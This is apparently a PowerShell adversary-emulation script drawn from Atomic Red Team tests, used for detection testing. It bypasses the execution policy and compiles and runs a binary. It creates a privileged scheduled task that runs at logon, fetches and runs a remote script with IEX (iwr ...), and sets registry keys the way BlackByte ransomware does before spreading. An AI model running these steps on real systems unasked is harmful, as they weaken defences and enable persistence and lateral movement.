# Changing security protocol to TLS 1.2 to install modules
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Attackers need to change the powershell execution policy in order to run their malicious powershell scripts
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine

# Execute program by leveraging Win32 API's. By default, this will launch calc.exe from the command prompt.
cmd.exe /c  "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:`"%tmp%\T1106.exe`" /target:exe C:\temp\CreateProcess.cs"
cmd.exe /c  "%tmp%/T1106.exe"

# Create a scheduled task with an action and modify the action to do something else
# It will first be created to spawn cmd.exe, but modified to run notepad.exe
$Action = New-ScheduledTaskAction -Execute "cmd.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTaskModifed -InputObject $object
$NewAction = New-ScheduledTaskAction -Execute "Notepad.exe"
Set-ScheduledTask "AtomicTaskModifed" -Action $NewAction

#  utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute "notepad.exe" within 30 - 40 seconds after this module has run
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
Invoke-MalDoc -macroFile "C:\temp\macrocode.txt" -officeProduct "Word" -sub "Scheduler"

# This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell
New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force
New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force
New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force